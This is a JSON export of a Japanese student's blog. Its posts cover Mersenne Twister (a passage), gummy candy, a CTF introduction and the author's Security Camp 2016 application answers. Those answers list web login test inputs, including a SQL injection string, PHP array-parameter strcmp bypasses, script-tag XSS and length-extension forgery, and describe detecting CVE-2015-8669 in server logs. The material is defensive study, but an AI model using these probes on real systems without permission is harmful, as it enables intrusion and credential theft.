\"\\n\"\nend\n```\n\n（あんまり自信がないですが、MTの考案者が書いた[C++プログラム](http://www.math.sci.hiroshima-u.ac.jp/~m-mat/MT/MT2002/CODES/mt19937ar.c)と出力が一致したので、多分大丈夫。）\n\nこうやってみると、本当に**単純**ですね！\nそれでいて性能がたいへんよろしいのですから、スゴイものです。\n\nちなみに↑はもともとPerlで書いてたんですが、諸事情によりRubyで書き直しました。以下はPerl版。\n\n[Perl版](https://gist.github.com/kaz/0bd9bcd72a964864e74fd55bcdfd3117)\n\n# 発展\n\nとりあえずMTがこういうものだって、わかった気になれたわけです。\n個人的には、 _Tempering_ のトコロが面白いと思っていて、ココをもうちょっと掘り下げてみたいと思います。\n\nTemperingは正則行列$T$を右から掛ける演算ですが、\nこの$T$が実際にはどんな行列なのかには、触れませんでした。\n\nでも、正則行列ってことは**逆行列**が存在して、Temperingの逆演算もできて……？\nみたいなお話です。（なんか楽しそうな気がしません？）\n\nということで、次回に続く！！！\n\n[メルセンヌ・ツイスタを倒す](/posts/6/)\n","title":"メルセンヌ・ツイスタをわかった気になる","image":null,"tags":["メルセンヌ・ツイスタ","乱数"],"date":"2016-06-26T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"4","body":"神のグミ\n\n## Cケア フルーツアソート\n\nこれです（買い占めた）\n![](1.jpg)\n\n断面図\n![](2.jpg)\n中心部は柔らかいフツーのグミなんですが、その周りがコーティングされてて、\nこれがカリカリしてて絶妙にウマイ。\n\n味は4種類。左からアサイー＆ブルーベリー、グレープ、レモン、マスカット。\n![](3.jpg)\nオススメはレモンです。\n（この画像、[Google Dots](https://www.google.co.jp/search?q=Google+Dots&tbm=isch)をイメージしたんですけど、伝わるだろうか。）\n\n## 事始め\n\n時は2015年の春。\n\n青春18きっぷでの旅行中、岐阜県は中津川駅の売店で。\n同行者がレモン味のCケアを買ってて、1粒もらったんですが、もう神ががったウマさでしたね。\n\n## それから\n\nhttps://twitter.com/sekai67/status/723738046017851393\n\nhttps://twitter.com/sekai67/status/725300208720990208\n\nこれなかなか売ってないんですよね。近所のスーパーとかコンビニ探しまわったんですが、無い。\n\n## 神\n\n突如として某工大生協に現れた「Cケア フルーツアソート」\n\nhttps://twitter.com/sekai67/status/729564647381073920\n\nhttps://twitter.com/sekai67/status/744183520382197761\n\nビビリましたね……仕入れ担当者有能すぎない？？？？？\n\n## その後\n\nCケアうまいよ！！！ってメッチャ布教した結果\n\n\nhttps://twitter.com/sekai67/status/738249545398681600\n\nhttps://twitter.com/sekai67/status/742622738418786304\n\nhttps://twitter.com/sekai67/status/743305211029004289\n\nhttps://twitter.com/sekai67/status/744735770594840576\n\nは？キレた。\n\n## そして\n\n売り切れる前に買えばいいじゃんということで買い占めに走った結果、\n「**Cケアを買い占める害悪**」として噂されるようになりました。めでたしめでたし。\n\nhttps://twitter.com/sekai67/status/745104531084574721\n\nhttps://twitter.com/sekai67/status/745066944882040832\n","title":"Cケア","image":null,"tags":["日記","食品","Cケア","グミ"],"date":"2016-06-22T00:00:00.000Z","updated":"2021-01-07T13:52:12.000Z"},{"type":"article","slug":"3","body":"しました。\n\n# セキュリティ・キャンプ\n\nわりと昔から知ってたんですけど、セキュリテイに特段興味があったわけじゃなかったので、ふーんってカンジだったんですけど、\n去年の末にCTFを始めてから、セキュリティ興味あるある！ってなったので、今年はじめて応募してみた次第です。\n\n# 結果\n\nhttps://twitter.com/sekai67/status/742559409730027521\n\nなんか微妙な気持ち。\n他の参加者さんを見てると、知識や気概が自分よりはるかにあって、スゴイなーって。\nわりと軽いキモチで応募した自分なんかが入って良いのだろーか、みたいな。\n\nそんなことを言ってますが、なんだかんだ言って嬉しいです。\nせっかくセキュキャンに行くからには、**ガチ**でガンバリます。\n↓の応募用紙を見直してて勉強不足を痛感しましたし、精進します。\n\nということで、末席に名を連ねる運びと相成りましたが、どうぞよろしくお願い致します。\n\n# 応募用紙\n\nどんなことを書いたのか、晒します。（恥ずかしい。。。）\n\n## 共通問題1\n\n1. あなたが今まで作ってきたものにはどのようなものがありますか？いくつでもいいので、ありったけ自慢してください。\n2. それをどのように作りましたか？ソフトウェアの場合にはどんな言語で作ったのか、どんなライブラリを使ったのかなども教えてください。\n3. 開発記のブログなどあれば、それも教えてください。コンテストなどに出品したことがあれば、それも教えてください。\n\nそのまま書くとアレなので、抜粋。\n\n- プログラミングはゲームを作りたくて始めたよ\n  - ゲームたくさん作ったよ\n  - HSPプロコンで入賞したりしたよ\n- U-20プロコンで賞をもらったよ\n- ソシャゲの情報を勝手に収集して公開するWebサービスを作ったよ\n  - クローラはJava、DBはMySQL、フロントはPHPだよ\n  - 月間15万PVくらいあるよ\n- 大学のサークル向けのクローズドなSNSを作ったよ\n  - サーバはnode.jsでSocket.ioで通信するよ\n  - SAML IdPになって他のサービスと連携できるようになってるよ\n  - クライアントはHTML/JSで書いて、いわゆるハイブリットアプリにてラクしたよ\n- OSSプロジェクトにちょっとだけコード投げてるよ\n\nみたいな事を書いた。\n\n## 共通問題2\n\n1. あなたが経験した中で印象に残っている技術的な壁はなんでしょうか？(例えば、C言語プログラムを複数ファイルに分割する方法)\n2. また、その壁を乗り越えるために取った解決法を具体的に教えてください。 (例えば、知人に勧められた「〇〇」という書籍を読んだ)\n3. その壁を今経験しているであろう初心者にアドバイスをするとしたら、あなたはどんなアドバイスをしますか？\n\n抜粋。\n\n- ドキュメントが充実してないライブラリ的なを使うのが辛かった\n- ググっても情報が手に入らないし、もう全部ソース読むわ\n  - ソース読んだら中身がメッチャよくわかるし神（それはそう）\n- 困ったらソース読もう\n  - ソース読んだらそのプロジェクトにContributeもできる！！！楽しい！！！！！\n\n## 共通問題3\n\nこれ、自分が思うに **一番大事な設問** な気がします。\n_強いけど学ぶ意欲が見られない人_ と _強くはないけどメッチャやる気のある人_ だったら、後者が通るだろうなぁ、って。\nその学ぶ意欲的なものをアピールするのがココなので。。。\n\nかく言う自分の書いたヤツ、微妙。。。\nなんか他の人が上げてるヤツ、ヤバい。まず分量が桁違い。\nなんでボク通ったんだろうか。\n\n### (1)あなたが今年のセキュリティ・キャンプで受講したいと思っている講義は何ですか？(複数可) そこで、どのようなことを学びたいですか？なぜそれを学びたいのですか？\n\n> 「クラウドセキュリティ基礎」や「サーバ運用におけるパスワード管理」を初めとする、ネットワーク、Web系の講義に最も興味があります。\n> 先に述べたような、Webアプリケーションを作ったり、CTFコンテストに参加したりして、脆弱な実装は本当に怖いということを身を持って感じました。\n> そこで、セキュアなアプリケーションを作れるように、どのような攻撃手法が存在し、防ぐにはどうすればよいかを詳しく知っておきたいです。\n> また、「ID連携基礎」にも興味があります。実際に複数のアプリケーションでID連携をするソフトウェアを制作したのですが、\n> 直接パスワードなどを扱う部分であるため、本当に気をつけて実装しなければならないと感じ、認証技術についてより詳しく知らなければならないと思いました。\n> また、「人工知能とセキュリティ」にも興味があります。私は人工知能の研究にも興味があったのですが、それとセキュリティを関連付けて考えたことがありませんでした。\n> そのため、人工知能とセキュリティについて、知ることができれば、今後人工知能を扱うときに参考になるかと思いました。\n> また、「オンラインゲームアタック＆ディフェンスチャレンジ」や「スマートフォン向けゲームのセキュリティ」にも興味があります。\n> 私はこういったゲームでよく遊ぶのですが、こうしたゲームで散見されるチート行為、それがどのように行われ、運営者はそれをどのように見つけているのか、ずっと疑問に思っていました。\n> また私は大学のサークルでゲーム制作をしているので、オンラインのゲームを作る際に不正をどうやって取り締まればよいのか知っておきたいと思いました。\n\n\n### (2)あなたがセキュリティ・キャンプでやりたいことは何ですか？身につけたいものは何ですか？(複数可) 自由に答えてください。\n\n> 「今少し知っている」知識を深めることもそうですが、「今ほとんど知らない」分野の知識についても、出来る限り獲得したいと思っています。\n> セキュリティの分野で活躍するには、ある特定の分野にだけ長けているのでは対応しきれないと思っていて、\n> もちろん自分の得意な分野を極めるのもそうですが、様々な関連分野の知識を持ち、\n> そうした広い分野についての知識を持っておくことで、何をするにしても広く視野を持つことができるような人間になりたいと思います。\n> セキュリティ・キャンプに参加することで、そうしたセキュリティのエキスパートへの第一歩を踏み出せればと思います。\n> また、同じ分野に興味を持つ同年代の人と知り合える数少ない機会であるので、人脈を作ることもできればと思っています。\n\n### 選択問題2\n\n    Googleは、自社のサービスのセキュリティを高めるために様々なことを行っています。\n    ブラウザからGoogleの検索サービス( https://www.google.co.jp/ )にアクセスを行い、どのようなセキュリティ施策が行われているかを見つけなさい。\n    ブラウザは任意のもので構いません。ブラウザのどういった点からどういった施策を行っていると判断できるのか、その理由も含めてできるだけ多くの項目を回答してください。\n    拡張機能を利用しても構いませんが、ブラウザ以外の方法でアクセスしてはいけません。\n\n間違ってそう。\n\n> Chromeでアクセスするとまず目につくのは、アドレスバーに表示される緑色の鍵マークです。\n> クリックして詳細を表示すると、「安全なTLS接続」と表示されますが、\n> これはTLSを用いた接続を行っており、通信が正しく暗号化されていることを示しています。\n> また同時に「有効な証明書」と表示されますが、これはサーバー証明書の検証に成功し、\n> このコンテンツは確かにGoogle社のサーバーから提供されたものであることを示しています。\n> またスマートフォン版のChromeから見ると、「証明書の透明書に関する有効な情報がサーバーから提供されました」と表示され、\n> これはCertificateTransparencyという技術で、これはGoogleのサーバが提示した証明書が不正な証明書でないことを表しています。\n> また、「ECDHE_ECDSA」が鍵交換に使用されている旨が表示されますが、\n> ECDHEには前方秘匿性があり、サーバの持つ秘密鍵が万が一流出したとしても、過去の通信記録からその内容が暴かれることがなくなります。\n> またECDSAは、一般的なRSAと比べると同じセキュティレベルを得るために必要な鍵の長さが短いとされており、より安全性が高いと考えられます。\n> FirefoxでTLS証明書を見ると、署名アルゴリズムに「SHA-256」を利用しており、これは古い方式SHA-1に比べハッシュ衝突に対する高い耐性を持ちます。\n> また、Firebugなどの拡張機能を用いて通信を見ると、「X-Frame-Options: SAMEORIGIN」ヘッダが送信されているのがわかり、\n> これによって、フレームを利用しててこのページを別のサイトに組み込むことが出来ず、クリックジャッキングを防ぐことが出来ます。\n> また「X-XSS-Protection: 1; mode=block」ヘッダが送信されており、これによってブラウザのXSS対策機能を有効化しており、これによりある程度のXSSを防止することが出来ます。\n> また「Content-Type: text/html; charset=UTF-8」のようなヘッダで文字コードが指定されており、レガシーなブラウザを標的としたUTF-7 XSS攻撃も対策されています。\n> HTMLソースを表示すると、埋め込まれたJSコードも含め、圧縮（難読化）されているのがわかり、攻撃者にページ構造を理解させない措置とも見ることが出来ます。\n\n### 選択問題4\n\n    突然だが、RH Protocolで用いられるRHパケットのフォーマットを以下に示す。なおRH Protocolは実在しないプロトコルであり、その内容について特に意味は無い。\n    (略)\n    添付するバイナリは、とあるRHストリームのうち片方向のみを抽出したものである。\n    このバイナリストリームを読み込み、1つのRHパケットが以下の条件のすべてにマッチするときに標準出力に文字列\"PASS\"、 それ以外の場合は\"REJECTED\"と表示するCもしくはC++のプログラムを記述し、実行結果と共に提出せよ。\n    また、マッチングにかかるCPUサイクル及びメモリ使用量を計測し記載した場合、評価に加味する。\n    (略)\n\nごちうさ。\n\nなんかボクの書いたやつ、ミスってる気がする。\n応募用紙上げてる人の出力結果と一致してない……オワタ……ってなってた。\n（結局わからず）\n\n```C\n#include <iostream>\n#include <string>\nusing namespace std;\n\n/* データの長さ */\n#define MAGIC_LENGTH 2\n#define SRC_LENGTH   20\n#define DST_LENGTH   20\n\n/* RH Packet 構造体 */\ntypedef struct {\n    string Magic;\n    string Source;\n    string Destination;\n    int DataLength;\n    string Data;\n} Packet;\n\n/* 文字列を小文字に */\nstring toLower(string in){\n    for(int i = 0; i < in.length(); i++){\n        in[i] += ('A' <= in[i] && in[i] <= 'Z' ? 32 : 0);\n    }\n    return in;\n}\n/* 16進数のcharを１０進数のintに */\nint hexToDec(char a){\n    return '0' <= a && a <= '9' ? a - '0' : a - 'a' + 10;\n}\n/* ストリームから1byte分のデータを読む */\nchar readByte(){\n    char buf, buf2;\n    while(cin >> buf){\n        if(('0' <= buf && buf <= '9') || ('a' <= buf && buf <= 'f')){\n            cin >> buf2;\n            return 16 * hexToDec(buf) + hexToDec(buf2);\n        }\n    }\n    return -1;\n}\n/* ストリームからintを読む */\nint readInt(){\n    int val;\n    for(int i = 3; i >= 0; i--){\n        char byte = readByte();\n        if(byte == -1){\n            return -1; /* 標準入力が終端に達しているとき-1を返す */\n        }\n        ((char*) &val)[i] = byte;\n    }\n    return val;\n}\n/* ストリームから文字列を読む */\nstring readString(int length){\n    char bytes[length + 1];\n    for(int i = 0; i < length; i++){\n        bytes[i] = readByte();\n    }\n    bytes[length] = '\\0';\n    return bytes;\n}\n/* ストリームからパケットを読む */\nPacket readPacket(){\n    Packet p;\n    p.Magic = readString(MAGIC_LENGTH);\n    p.Source = readString(SRC_LENGTH);\n    p.Destination = readString(DST_LENGTH);\n    p.DataLength = readInt();\n    p.Data = readString(p.DataLength);\n    return p;\n}\n\n/* パケットの正当性確認 */\nbool checkPacket(Packet p){\n    return\n    /* Condition 1 */\n    ( p.Magic == \"RH\" ) &&\n    /* Condition 2 */\n    ( toLower(p.Source) == \"rise-san\" ||\n      toLower(p.Source) == \"cocoa-san\" ) &&\n    /* Condition 3 */\n    ( toLower(p.Destination) == \"chino-chan\" ||\n      toLower(p.Destination) == \"chino\" ) &&\n    /* Condition 4 */\n    ( toLower(p.Source) != \"cocoa-san\" ||\n      toLower(p.Destination) != \"chino\" ) &&\n    /* Condition 5 */\n    ( p.Data.find(\"BlueMountain\") != string::npos ||\n      p.Data.find(\"Columbia\") != string::npos ||\n      p.Data.find(\"OriginalBlend\") != string::npos ) &&\n    /* Condition 6 */\n    ( p.Data.find(\"DandySoda\") == string::npos &&\n      p.Data.find(\"FrozenEvergreen\") == string::npos ) ;\n}\n\nint main(){\n    while(!cin.eof()){\n        Packet p = readPacket(); /* 1パケットを読む */\n        if(p.DataLength == -1){\n            break; /* 読み込みができていないとき */\n        }\n        cout << (checkPacket(p) ? \"PASS\" : \"REJECTED\") << endl; /* パケットを確認 */\n    }\n    return 0;\n}\n```\n\n出力結果\n>PASS\nPASS\nREJECTED\nPASS\nREJECTED\nPASS\nPASS\nREJECTED\nPASS\nREJECTED\nPASS\nREJECTED\nPASS\nREJECTED\nREJECTED\nPASS\nREJECTED\nPASS\nREJECTED\nREJECTED\nREJECTED\nPASS\nREJECTED\nPASS\nREJECTED\nREJECTED\nREJECTED\nREJECTED\nPASS\nREJECTED\nPASS\nREJECTED\nREJECTED\nREJECTED\nREJECTED\nREJECTED\nPASS\nREJECTED\nPASS\nREJECTED\nREJECTED\nREJECTED\nREJECTED\nREJECTED\nREJECTED\n\n### 選択問題6\n\n    IDとパスワードを入力したユーザの認証を行うWebアプリがあります。\n    あなたがこのアプリに対してセキュリティテストを行う場合、まず、どのようなテストをしますか？\n    なぜそのテストを選択したのか、その背景や技術的根拠と共に記載してください。\n    アプリの内部で使われている技術やシステム構成に、前提を置いても構いません。\n\nなんか応募する直前にksnctfをやってたので、ksnctfの問題にあった脆弱性をてきとうに挙げました(ﾉ≧ڡ≦)\n（ひどい）\n\n> まず、適当なURL、「./user.db」「./accouts.sqlite3」などにアクセスを試みます。\n> SQLite3を使用したシステムの場合、このようなデータベースファイルへ外部からアクセスできるようになっている場合、ユーザーの情報が簡単に盗まれてしまいます。\n>\n> 次に、ログインフォームに「'」や「\"」といった文字列を入力し挙動を見たり、、パスワードに「' OR '' = '」のような文字列を入力してログイン出来ないか調査します。\n> サーバーがデータの格納にSQLを使用しており、SQLで意味のある文字を適切にエスケープしていない場合、このようなSQLをインジェクション攻撃によって、\n> 不正にデータを書き換えたり、秘匿なデータを盗み出したり、パスワードを知らずともログインできたり、パスワードがハッシュ化されていても平文を求めることができてしまいます。\n>\n> 次に、スクリプトを用いて高頻度のログインリクエストを送信します。\n> 高頻度のリクエストに対して、Captchaのような画像認証をはじめとするBOT対策がなされていないと、ブルートフォース攻撃に晒される可能性があります。\n>\n> 次に、「password」のようなパラメータ名が設定されているフォームに対し、「password[]」のようなパラメータでリクエストを送信します。\n> サーバがPHPで実装されており、strcmpのような関数と曖昧な比較演算子(==)でパスワード比較がされていると、これでパスワード認証を突破される可能性があります。\n>\n> 次に、ユーザの入力したデータが再び表示されるようになっていないかを確認します。（パスワードが間違っていた場合、ユーザー名が予め入力されているなど）\n> このような機能がある場合、&lt;script&gt;タグでコードを埋め込めるようになっていないかを確認します。\n> 適切にエスケープされていない場合、XSS攻撃でCookieなどを盗まれる可能性があります。\n>\n> 次に、セッション情報のCookieがどのような形で渡されているのかを確認します。\n> Cookieにユーザー識別情報が乗せられていて、MD5のような脆弱なハッシュ関数で署名されていた場合、書き換えられる可能性があります。\n> また、署名の作り方によっては、LengthExtension攻撃などによって認証を突破される可能性があるので、この攻撃も試行します。\n\n### 選択問題11\n\n    2015 年に発行された CVEの内、あなたが興味を持った\"サーバに存在した\"脆弱性について１つ提示してください。\n    その脆弱性を悪用した攻撃を検知する方法について詳細に記述してください。また、興味を持った理由を記述してください。\n    CVE番号:CVE-2015-◯◯◯◯\n\n\n> 私が興味を持ったのは、CVE-2015-8669です。\n> この脆弱性は、phpMyAdminの古いバージョンに存在し、/libraries/config/messages.inc.phpという、\n> UI文字列情報が格納され、他のphpファイルからインクルードされることを想定したファイルに直接アクセスすることで引き起こされます。\n> このファイルに直接アクセスすることによって、本来は別のphpファイルで定義されるはずの関数が定義されておらず、\n> それを呼び出してしまうことで、スクリプトのフルパス情報を含むエラーメッセージを出力してしまうというものです。\n>\n> [攻撃を検知する方法]\\\n> HTTPサーバのアクセスログを確認することによって、容易に検知することが出来ます。\n> 攻撃を受けた場合、/libraries/config/messages.inc.phpへのアクセスが記録されます。\n> また、エラーログには実際に攻撃者に表示されたものと同じメッセージが記録されており、ここからも検知が出来ます。\n>\n> 実際のログ\\\n> 127.0.0.1 - - [30/May/2016:00:51:02 +0900] \"GET /phpmyadmin/libraries/config/messages.inc.php HTTP/1.1\" 200 266 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0\"\\\n> [Mon May 30 00:51:02.871439 2016] [:error] [pid 8968:tid 1836] [client 127.0.0.1:52477] PHP Fatal error:  Uncaught Error: Call to undefined function PMA_fatalError() in C:\\\\xampp\\\\htdocs\\\\phpmyadmin\\\\libraries\\\\config\\\\messages.inc.php:14\\nStack trace:\\n#0 {main}\\n  thrown in C:\\\\xampp\\\\htdocs\\\\phpmyadmin\\\\libraries\\\\config\\\\messages.inc.php on line 14\\\n>\n> [興味を持った理由]\\\n> まず、phpMyAdminは自分がよく利用するプロダクトの一つであったからです。\n> 次に、この脆弱性では、（サーバの設定によっては）ブラウザから当該のURLにリクエストを送るだけで成立してしまうなど、比較的簡単に攻撃が成立するのが面白いと思いました\n> また、これはベンダの発表文書でも述べられていたことですが、PHPの設定自体が適切にされていれば攻撃は成立せず、\n> この設定（display_errors = off）はテスト用サーバー以外では普通は設定されるものであり、\n> また仮に攻撃が成立したとしても、その被害はさほど大きなものでなく（phpMyAdminが設置されるパスが漏れるだけ）、\n> 私は一瞬「大した脆弱性ではないのではないか」と思ってしまいましたが、\n> こうして大々的に記録されているところを見て、このようにどんな小さな脆弱性であっても、それが大きな攻撃の糸口とならないよう、\n> 常に注意していくべきなのだなと、考えを改めさせられました。\n> このように、自分のセキュリティに対する意識にも関わるものであったため、このCVEに興味を持ちました。\n","title":"セキュリティ・キャンプ2016に応募した","image":null,"tags":["日記","セキュリティ・キャンプ","セキュリティ"],"date":"2016-06-15T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"2","body":"最近にCTFにハマっています。\n\n# CTFってなに\n\n_CTF (Capture the Flag): 旗取り合戦_\n\nここではコンピュータセキュリティ競技のこと。\n\n「各チームにコンピュータが与えられてそれぞれのコンピュータの中の情報を奪い合う」攻防戦形式と、\n「複数に渡る分野の問題が出題される」クイズ形式(Jeopardy)がある。\n\nらしいです。（[traP](https://trap.jp/)部内CTF勉強会資料から引用）\n\n要は世間一般の人が _ハッカー_ って聞いて思い浮かべるようなアレを競うやつですね。\n\nまぁとにかく、 **楽しい** です。\n\nとっても勉強になるし、パズルみたいに頭を使うし、（答えを見ずに）解けた時には得も言われぬ達成感があります。\nさっきのザックリした説明を読んで興味を持った人はぜひぜひやりましょう。\n\n# CTFやろう\n\nCTFはたまーにデカい大会が催されるんですが、\nそれ以外にも常設のCTFサイトがいくつかあって、\nそこで問題にチャレンジできます。\n\n## オススメ常設CTF\n- [OverTheWire Bandit](http://overthewire.org/wargames/bandit/)\n  - 基礎中の基礎みたいなかんじ。初めての人にメッチャおすすめ。英語だけど。。。\n- [OverTheWire Natas](http://overthewire.org/wargames/natas/)\n  - Web系の問題。Web系はとっつきやすい（感じがする）ので、Banditが終わったらおすすめ。\n- [ksnctf](http://ksnctf.sweetduet.info/)\n  - 日本の有名なCTFサイト。いろんな分野の問題がある。\n\n# かくいう自分は\n\nhttps://twitter.com/sekai67/status/679199513702100992\n\nなんか去年の末に[@kotarou777775](https://twitter.com/kotarou777775)くんに誘われて始めたばっかりなので、\nクソ雑魚かつWeb系しか解けなくてまだまだなカンジなんですけど、ガンバりたい。\n\nこの前同じ大学の人達のチームに入れてもらって[Google Capture The Flag](https://capturetheflag.withgoogle.com/)に出たんですが、\n\n- Wallowing Wallabies - Part Two\n- Wallowing Wallabies - Part Three\n- Purple Wombats\n- Flag Storage Service\n\nの４つをガンバって解きました。全部Webだけど。。。\n\nチームにガチプロ👏が多かったおかげか全体で85位でした。やべぇ。\n\n# 以上\n\nCTFやろう\n","title":"CTFのはなし","image":null,"tags":["日記","CTF","セキュリティ"],"date":"2016-06-08T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"article","slug":"1","body":"表題のとおりです。\n\nちょこちょこと大学のサークルのブログに記事を投げていたんですが、\nサークルの趣旨はちょっと違う技術系な記事を気軽に書きたいな、ということで。\n\nいつも数週もすると飽きるんですが、ガンバる。\n\nサークルのブログに書いた個人の記事はコチラから↓\n\nhttps://trap.jp/author/kaz/\n","title":"ブログを始めました","image":null,"tags":[],"date":"2016-06-06T00:00:00.000Z","updated":"2021-01-07T09:09:45.000Z"},{"type":"external","url":"https://trap.jp/post/53/","publisher":"東京工業大学デジタル創作同好会traP","title":"ハッカソン参加記 - GitLove -","tags":["traP","ハッカソン","参加記"],"date":"2016-05-23T00:00:00.000Z"},{"type":"external","url":"https://trap.jp/post/39/","publisher":"東京工業大学デジタル創作同好会traP","title":"ConoHaでArchLinuxを動かすまで","tags":["traP","インフラ","ConoHa"],"date":"2016-02-25T00:00:00.000Z"},{"type":"external","url":"https://trap.jp/post/30/","publisher":"東京工業大学デジタル創作同好会traP","title":"ボクは女の子になった (Live2D / clmtrackr)","tags":["traP","アドベントカレンダー","Live2D","clmtracker"],"date":"2015-12-22T00:00:00.000Z"}]},"__N_SSG":true}